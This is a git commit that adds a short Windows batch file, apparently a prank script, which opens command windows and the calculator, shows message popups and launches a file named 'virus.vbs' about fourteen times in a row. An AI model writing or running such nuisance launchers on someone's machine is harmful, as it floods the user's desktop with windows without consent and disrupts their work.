910e28c6215bacce33378cb0b015a3c300f02c3c
Mich404Teapod <101505439+Mich404Teapod@users.noreply.github.com>
2022-05-10 20:03:55 +0200

    Create index.bat

---
+++ 1000000MSG/index.bat
@@ -0,0 +1,23 @@
+cmd.exe
+cmd.exe
+calc.exe
+msg "1"
+msg "2"
+start error sol.exe
+start virus.vbs
+start error sol.exe
+start virus.vbs
+start virus.vbs
+start virus.vbs
+ping localhost -n 3>nul
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+start virus.vbs
+pause
